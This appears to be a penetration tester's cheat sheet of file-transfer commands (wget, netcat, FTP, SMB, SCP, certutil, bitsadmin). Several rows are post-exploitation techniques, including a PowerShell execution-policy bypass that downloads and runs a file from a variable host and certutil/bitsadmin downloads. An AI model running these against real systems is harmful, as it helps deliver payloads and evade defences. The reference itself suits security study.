# File Transfer

| Command | Description |
|---------|-------------|
| `wget http://$IP/file -O /tmp/test.tmp` | Download a file using `wget` and save it as `/tmp/test.tmp`. |
| `curl http://$IP/file` | Download a file using `curl`. |
| `fetch http://$IP/file` | Download a file using `fetch`. |
| `nc $IP $port > outfile` | Netcat to transfer data to a file. |
| `nc -lnvp $port < infile` | Netcat to listen on a port and send data from a file. |
| `ftp -s:input.txt` | FTP command with a script file input. |
| `ftp $ip` | FTP connection to a specified IP. |
| `get $filename` | Download a file using FTP. |
| `sudo apt install python-pyftpdlib` | Install Python FTP library. |
| `sudo python -m pyftpdlib -p 21` | Start an FTP server on port 21. |
| `python -m SimpleHTTPServer 80` | Start a simple HTTP server on port 80 (Python 2.x). |
| `python -m http.server 80` | Start a simple HTTP server on port 80 (Python 3.x). |
| `curl -O http://$ip/putty.exe` | Download a file using `curl` and output to a file. |
| `python smbserver.py ata /root/share` | Start an SMB server with the specified share directory. |
| `[WIN+R] \\$ip` | Access the remote machine using SMB from Windows Run. |
| `apt install smbclient` | Install `smbclient` for SMB operations. |
| `smbclient -L $ip` | List shared resources on the remote SMB server. |
| `smbclient //$ip/ata` | Access a specific SMB share on the remote machine. |
| `(new-object System.Net.WebClient).DownloadFile('//$ip/putty.exe', 'd:\\data\\putty.exe')` | Download a file via SMB using PowerShell. |
| `bitsadmin /transfer job //example.com/path/putty.exe F:\\putty.exe` | Download a file via BITS in Windows. |
| `php -S 0.0.0.0:80` | Start a PHP server on port 80. |
| `scp $filename user@host:~/path_dir` | Securely copy a file to a remote server using SCP. |
| `scp $filename $username@$ip:~/` | Securely copy a file to a remote server using SCP. |
| `python -m pyftpdlib 21` | Start an FTP server on port 21 (attacker machine). |
| `ftp $ip` | FTP connection to a specified IP. |
| `bitsadmin /transfer download /priority normal http://$ip/file C:\\output\\path` | BITS download command for Windows 7/Server 2000+. |
| `powershell.exe -exec bypass -Command “& {iex((New-Object System.Net.WebClient).DownloadFile('http://$ip:$port/$filename','C:\\Users\\user\\AppData\\Local\\ack.exe'));}”` | Download a file and execute via PowerShell bypass. |
| `certutil -urlcache -split -f “http://$ip/$filename" $filename` | Use `certutil` to download and cache a file. |
| `echo $storageDir = $pwd > wget.ps1` | Create a PowerShell script to set the storage directory to the current working directory. |
| `echo $webclient = New-Object System.Net.WebClient >> wget.ps1` | Add to PowerShell script to initialize a WebClient. |
| `echo $url = "http://$ip/$filename" >> wget.ps1` | Add to PowerShell script to set the URL. |
| `echo $filename = "filename" >> wget.ps1` | Add to PowerShell script to define the filename. |
| `echo $webclient.DownloadFile($url,$filename) >> wget.ps1` | Add to PowerShell script to download the file. |
| `powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File $filename` | Execute the PowerShell script to download the file. |
